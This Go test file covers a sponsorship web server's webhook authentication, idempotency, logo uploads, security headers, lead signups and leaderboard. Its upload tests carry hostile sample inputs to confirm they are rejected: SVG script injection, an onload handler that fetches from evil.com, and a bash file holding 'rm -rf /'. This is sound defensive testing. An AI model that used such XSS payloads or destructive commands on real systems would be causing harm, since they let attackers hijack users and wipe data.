package server

import (
	"bytes"
	"encoding/json"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/buchin/cuan/internal/config"
	"github.com/buchin/cuan/internal/sponsorship"
)

func setupTestServerWithSponsorship(t *testing.T) (*Server, func()) {
	t.Helper()
	tempDir, err := os.MkdirTemp("", "cuan-server-sponsorship-test-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}

	cfg := &config.Config{
		Environment:       "test",
		ServerPort:        "8080",
		AuthSecret:        "test-owner-secret-12345",
		DojoWebhookSecret: "test-dojo-secret-xyz",
		SponsorLogosDir:   tempDir,
		StaticDir:         tempDir,
		AppVersion:        "0.2.0-s2",
	}

	s := NewServer(cfg, nil)

	cleanup := func() {
		_ = os.RemoveAll(tempDir)
	}

	return s, cleanup
}

func TestDojoWebhookHTTP(t *testing.T) {
	s, cleanup := setupTestServerWithSponsorship(t)
	defer cleanup()

	// Create test sponsor first via intake
	sp, err := s.SponsorshipService().CreateSponsor(t.Context(), sponsorship.CreateSponsorRequest{
		BrandName:    "Test Brand Co",
		WebsiteURL:   "https://testbrand.co",
		ContactEmail: "founder@testbrand.co",
	})
	if err != nil {
		t.Fatalf("failed to create initial sponsor: %v", err)
	}

	// 1. Invalid Webhook Secret -> 401 Unauthorized
	reqBody := `{"order_id": "dojo_http_001", "amount": 1000000, "status": "paid"}`
	req := httptest.NewRequest(http.MethodPost, "/api/webhooks/dojo", strings.NewReader(reqBody))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Dojo-Secret", "wrong-secret")
	w := httptest.NewRecorder()

	s.Router().ServeHTTP(w, req)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401 Unauthorized for bad secret, got %d: %s", w.Code, w.Body.String())
	}

	// 2. Missing order_id -> 400 Bad Request
	reqBodyBad := `{"order_id": "", "amount": 1000000, "status": "paid"}`
	req = httptest.NewRequest(http.MethodPost, "/api/webhooks/dojo", strings.NewReader(reqBodyBad))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Dojo-Secret", "test-dojo-secret-xyz")
	w = httptest.NewRecorder()

	s.Router().ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 Bad Request for missing order_id, got %d: %s", w.Code, w.Body.String())
	}

	// 3. Valid Webhook Delivery (First time) -> 200 OK
	validBody := map[string]interface{}{
		"order_id":   "dojo_http_001",
		"amount_idr": 1500000,
		"status":     "paid",
		"sponsor_id": sp.ID,
	}
	bodyBytes, _ := json.Marshal(validBody)

	req = httptest.NewRequest(http.MethodPost, "/api/webhooks/dojo", bytes.NewReader(bodyBytes))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Dojo-Secret", "test-dojo-secret-xyz")
	w = httptest.NewRecorder()

	s.Router().ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 OK on valid webhook, got %d: %s", w.Code, w.Body.String())
	}

	var res1 sponsorship.WebhookResult
	if err := json.NewDecoder(w.Body).Decode(&res1); err != nil {
		t.Fatalf("failed to parse webhook response: %v", err)
	}
	if !res1.Processed || res1.AlreadyProcessed {
		t.Fatalf("expected processed=true, already_processed=false, got %+v", res1)
	}
	if res1.SponsorStatus != sponsorship.SponsorStatusPendingReview {
		t.Fatalf("expected sponsor status pending_review, got %s", res1.SponsorStatus)
	}

	// 4. Duplicate Webhook Delivery (Idempotency) -> 200 OK, already_processed=true
	req = httptest.NewRequest(http.MethodPost, "/api/webhooks/dojo", bytes.NewReader(bodyBytes))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer test-dojo-secret-xyz") // Test Bearer auth
	w = httptest.NewRecorder()

	s.Router().ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 OK on duplicate webhook, got %d: %s", w.Code, w.Body.String())
	}

	var res2 sponsorship.WebhookResult
	if err := json.NewDecoder(w.Body).Decode(&res2); err != nil {
		t.Fatalf("failed to parse duplicate webhook response: %v", err)
	}
	if res2.Processed || !res2.AlreadyProcessed {
		t.Fatalf("expected idempotent response: processed=false, already_processed=true, got %+v", res2)
	}

	// 5. Test v1 alias route (/api/v1/webhooks/dojo)
	aliasBody := map[string]interface{}{
		"order_id":   "dojo_http_002",
		"amount_idr": 2000000,
		"status":     "paid",
	}
	aliasBytes, _ := json.Marshal(aliasBody)
	req = httptest.NewRequest(http.MethodPost, "/api/v1/webhooks/dojo?secret=test-dojo-secret-xyz", bytes.NewReader(aliasBytes))
	req.Header.Set("Content-Type", "application/json")
	w = httptest.NewRecorder()

	s.Router().ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 OK on /api/v1/webhooks/dojo alias, got %d: %s", w.Code, w.Body.String())
	}
}

func TestUploadSponsorLogoHTTP(t *testing.T) {
	s, cleanup := setupTestServerWithSponsorship(t)
	defer cleanup()

	// 1. Valid PNG upload
	var b bytes.Buffer
	w := multipart.NewWriter(&b)
	part, _ := w.CreateFormFile("logo", "brand.png")
	validPNG := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x11, 0x22}
	_, _ = part.Write(validPNG)
	_ = w.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/sponsors/upload-logo", &b)
	req.Header.Set("Content-Type", w.FormDataContentType())
	rec := httptest.NewRecorder()

	s.Router().ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 OK for valid PNG, got %d: %s", rec.Code, rec.Body.String())
	}

	var uploadResp map[string]interface{}
	_ = json.NewDecoder(rec.Body).Decode(&uploadResp)
	logoPath, ok := uploadResp["logo_path"].(string)
	if !ok || logoPath == "" {
		t.Fatalf("expected logo_path in response, got %+v", uploadResp)
	}

	// 2. Malicious SVG upload with <script> -> 400 Bad Request
	b.Reset()
	w = multipart.NewWriter(&b)
	part, _ = w.CreateFormFile("logo", "xss.svg")
	maliciousSVG := []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert('pwned')</script><circle r="10"/></svg>`)
	_, _ = part.Write(maliciousSVG)
	_ = w.Close()

	req = httptest.NewRequest(http.MethodPost, "/api/sponsors/upload-logo", &b)
	req.Header.Set("Content-Type", w.FormDataContentType())
	rec = httptest.NewRecorder()

	s.Router().ServeHTTP(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 Bad Request for malicious SVG, got %d: %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "berbahaya") {
		t.Fatalf("expected error message mentioning malicious file rejection, got %s", rec.Body.String())
	}

	// 3. Malicious SVG upload with onload event -> 400 Bad Request
	b.Reset()
	w = multipart.NewWriter(&b)
	part, _ = w.CreateFormFile("logo", "onload.svg")
	onloadSVG := []byte(`<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://evil.com')"><circle r="10"/></svg>`)
	_, _ = part.Write(onloadSVG)
	_ = w.Close()

	req = httptest.NewRequest(http.MethodPost, "/api/sponsors/upload-logo", &b)
	req.Header.Set("Content-Type", w.FormDataContentType())
	rec = httptest.NewRecorder()

	s.Router().ServeHTTP(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 Bad Request for onload SVG, got %d: %s", rec.Code, rec.Body.String())
	}

	// 4. Disallowed MIME (e.g. executable script disguised as png) -> 400 Bad Request
	b.Reset()
	w = multipart.NewWriter(&b)
	part, _ = w.CreateFormFile("logo", "script.sh")
	_, _ = part.Write([]byte(`#!/bin/bash\nrm -rf /`))
	_ = w.Close()

	req = httptest.NewRequest(http.MethodPost, "/api/sponsors/upload-logo", &b)
	req.Header.Set("Content-Type", w.FormDataContentType())
	rec = httptest.NewRecorder()

	s.Router().ServeHTTP(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 Bad Request for bash script, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestServeSponsorLogoHTTP(t *testing.T) {
	s, cleanup := setupTestServerWithSponsorship(t)
	defer cleanup()

	// Upload clean SVG
	cleanSVG := []byte(`<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10"/></svg>`)
	relPath, _, err := s.SponsorshipService().SaveLogo(cleanSVG, "clean.svg")
	if err != nil {
		t.Fatalf("failed to save clean svg: %v", err)
	}

	// Form URL from saved filename
	filename := relPath[strings.LastIndex(relPath, "/")+1:]
	req := httptest.NewRequest(http.MethodGet, "/uploads/sponsors/logos/"+filename, nil)
	rec := httptest.NewRecorder()

	s.Router().ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 OK when serving logo, got %d: %s", rec.Code, rec.Body.String())
	}

	// Verify Security Headers
	if rec.Header().Get("X-Content-Type-Options") != "nosniff" {
		t.Errorf("missing nosniff header")
	}
	if !strings.Contains(rec.Header().Get("Content-Security-Policy"), "default-src 'none'") {
		t.Errorf("missing strict CSP header")
	}
	if rec.Header().Get("Content-Type") != sponsorship.MIMETypeSVG {
		t.Errorf("expected Content-Type %s, got %s", sponsorship.MIMETypeSVG, rec.Header().Get("Content-Type"))
	}
}

func TestWaitingListLeadHTTP(t *testing.T) {
	s, cleanup := setupTestServerWithSponsorship(t)
	defer cleanup()

	// 1. Valid Signup
	body := `{"email": "solo.dev@cuan.dev", "source": "hero_cta"}`
	req := httptest.NewRequest(http.MethodPost, "/api/leads", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()

	s.Router().ServeHTTP(rec, req)
	if rec.Code != http.StatusCreated {
		t.Fatalf("expected 201 Created for valid lead, got %d: %s", rec.Code, rec.Body.String())
	}

	// 2. Invalid Email
	badBody := `{"email": "not-an-email"}`
	req = httptest.NewRequest(http.MethodPost, "/api/leads", strings.NewReader(badBody))
	req.Header.Set("Content-Type", "application/json")
	rec = httptest.NewRecorder()

	s.Router().ServeHTTP(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 Bad Request for bad email, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestCurrentSponsorsLeaderboardHTTP(t *testing.T) {
	s, cleanup := setupTestServerWithSponsorship(t)
	defer cleanup()

	ctx := t.Context()

	// Initially empty
	req := httptest.NewRequest(http.MethodGet, "/api/sponsors/current", nil)
	rec := httptest.NewRecorder()
	s.Router().ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 OK on empty leaderboard, got %d", rec.Code)
	}

	// Create and approve sponsor
	sp, err := s.SponsorshipService().CreateSponsor(ctx, sponsorship.CreateSponsorRequest{
		BrandName:    "Super Backer",
		WebsiteURL:   "https://superbacker.org",
		ContactEmail: "contact@superbacker.org",
	})
	if err != nil {
		t.Fatalf("create sponsor error: %v", err)
	}

	// Register paid order via webhook
	_, err = s.SponsorshipService().ProcessDojoWebhook(ctx, "test-dojo-secret-xyz", &sponsorship.DojoWebhookPayload{
		OrderID:   "dojo_leaderboard_01",
		AmountIDR: 5000000,
		Status:    "paid",
		SponsorID: sp.ID,
	})
	if err != nil {
		t.Fatalf("webhook error: %v", err)
	}

	// Still not visible before owner approval
	req = httptest.NewRequest(http.MethodGet, "/api/sponsors/current", nil)
	rec = httptest.NewRecorder()
	s.Router().ServeHTTP(rec, req)
	var respBefore map[string]interface{}
	_ = json.NewDecoder(rec.Body).Decode(&respBefore)
	if int(respBefore["total"].(float64)) != 0 {
		t.Fatalf("expected 0 sponsors before approval, got %v", respBefore["total"])
	}

	// Owner approves sponsor
	if err := s.SponsorshipService().ApproveSponsor(ctx, sp.ID, "owner"); err != nil {
		t.Fatalf("approve error: %v", err)
	}

	// Now visible on public leaderboard
	req = httptest.NewRequest(http.MethodGet, "/api/sponsors/current", nil)
	rec = httptest.NewRecorder()
	s.Router().ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 OK, got %d: %s", rec.Code, rec.Body.String())
	}

	var respAfter map[string]interface{}
	_ = json.NewDecoder(rec.Body).Decode(&respAfter)
	if int(respAfter["total"].(float64)) != 1 {
		t.Fatalf("expected 1 sponsor on leaderboard, got %v", respAfter["total"])
	}
}

// Unused import guard
var _ = time.Now
var _ = io.Discard
